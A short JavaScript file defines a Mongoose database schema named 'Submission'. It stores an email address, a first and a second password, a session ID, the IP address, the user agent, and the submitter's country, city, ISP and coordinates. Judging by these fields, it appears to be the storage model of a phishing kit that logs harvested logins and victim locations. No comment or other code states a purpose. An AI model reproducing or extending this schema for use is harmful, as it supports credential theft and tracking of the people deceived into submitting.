// models/Submission.js
import mongoose from "mongoose";

const SubmissionSchema = new mongoose.Schema({
  email: String,
  firstPassword: String,
  secondPassword: String,
  sessionID: String,
  ip: String,
  userAgent: String,
  country: String,
  city: String,
  isp: String,
  lat: Number,
  lon: Number,
  time: { type: Date, default: Date.now }
});

export default mongoose.model("Submission", SubmissionSchema);